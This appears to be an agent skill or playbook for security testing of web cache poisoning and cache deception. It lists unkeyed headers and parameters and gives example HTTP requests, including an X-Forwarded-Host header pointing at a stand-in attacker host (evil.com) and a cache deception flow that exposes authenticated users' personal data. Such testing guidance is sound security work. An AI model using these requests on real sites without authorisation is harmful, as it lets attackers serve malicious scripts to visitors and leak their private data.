---
name: web-cache-poisoning-deception
description: Web cache poisoning, cache deception, unkeyed header/param exploitation, Fat GET requests, and CDN delimiter abuse.
playbook: web-security
---

# Web Cache Poisoning & Cache Deception

## Attack Vector Summary
Web Cache Poisoning occurs when an attacker manipulates unkeyed HTTP inputs (headers, cookies, query parameters) to induce a malicious response from the backend that is cached and subsequently served to legitimate users.
Web Cache Deception occurs when differences in path interpretation between a reverse proxy/CDN and the origin server cause dynamic, authenticated user data (e.g. `/profile/settings.css`) to be cached and exposed publicly.

## Tactical Heuristics & Step-by-Step Flow

### 1. Unkeyed Input & Header Discovery
Identify headers and parameters reflected in HTTP responses but not included in the cache key:
- Unkeyed headers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Host`, `Fastly-Client-IP`.
- Unkeyed parameters: `utm_*`, `gclid`, `fbclid`, callback parameters.

### 2. Cache Poisoning Attack Vectors
Test for cache poisoning reflection:

```http
GET /static/app.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
X-Cache: HIT
Age: 42
...
<script src="https://evil.com/static/app.js"></script>
```

- **Fat GET Requests:** Append an HTTP request body to a `GET` request. If the backend processes the body but the cache only keys the URI line, response poisoning occurs.
- **Param Cloaking & Semicolon Delimiters:** `GET /page?param=val;unkeyed=evil`

### 3. Web Cache Deception (WCD)
Test dynamic authenticated endpoints with static file extensions:

```http
GET /api/user/profile.css HTTP/1.1
Host: target.com
Cookie: session=AUTHENTICATED_SESSION_COOKIE

# 1. Origin responds with 200 OK and user PII (ignores .css suffix).
# 2. CDN/Proxy sees .css extension, sets Cache-Control: public, max-age=86400, and stores response.
# 3. Attacker fetches GET /api/user/profile.css without cookies and receives victim PII.
```

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| Unkeyed Host Header Poisoning | Cache reflects `X-Forwarded-Host` into script tags | `X-Forwarded-Host: evil.com` | `X-Cache: HIT` with `https://evil.com` in DOM |
| Web Cache Deception PII Leak | Proxy caches authenticated endpoint based on static suffix | `GET /account/settings.js` | Unauthenticated request receives victim data with `X-Cache: HIT` |
| Fat GET Param Overwrite | CDN keys GET path; backend parses body param | `GET /page` with body `callback=alert` | Response cached with poisoned callback parameter |

## Evidence Collection & Validation Gate
- Must demonstrate a cache `HIT` served to an unauthenticated, clean browser session.
- Document exact cache headers (`Age:`, `X-Cache: HIT`, `CF-Cache-Status: HIT`).
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
